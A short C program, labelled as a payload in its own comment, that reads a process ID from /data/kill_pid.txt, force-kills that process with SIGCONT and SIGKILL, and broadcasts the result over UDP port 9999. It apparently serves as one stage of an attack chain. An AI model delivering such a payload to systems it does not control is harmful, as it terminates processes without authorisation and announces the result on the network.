// Payload: SIGCONT + SIGKILL the pid found in /data/kill_pid.txt, report via UDP broadcast.
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static void udp(const char* m) {
  int s = socket(AF_INET, SOCK_DGRAM, 0);
  int yes = 1;
  setsockopt(s, SOL_SOCKET, SO_BROADCAST, &yes, sizeof yes);
  struct sockaddr_in d = {0};
  d.sin_family = AF_INET;
  d.sin_port = htons(9999);
  inet_pton(AF_INET, "255.255.255.255", &d.sin_addr);
  sendto(s, m, strlen(m), 0, (struct sockaddr*)&d, sizeof d);
  close(s);
}

int main(void) {
  FILE* f = fopen("/data/kill_pid.txt", "r");
  int pid = 0;
  if (!f || fscanf(f, "%d", &pid) != 1) {
    udp("killpid: no /data/kill_pid.txt");
    return 1;
  }
  fclose(f);
  char line[160];
  int r1 = kill(pid, SIGCONT), e1 = errno;
  int r2 = kill(pid, SIGKILL), e2 = errno;
  snprintf(line, sizeof line, "killpid: pid=%d CONT=%d(errno %d) KILL=%d(errno %d)", pid, r1, e1, r2, e2);
  udp(line);
  return 0;
}
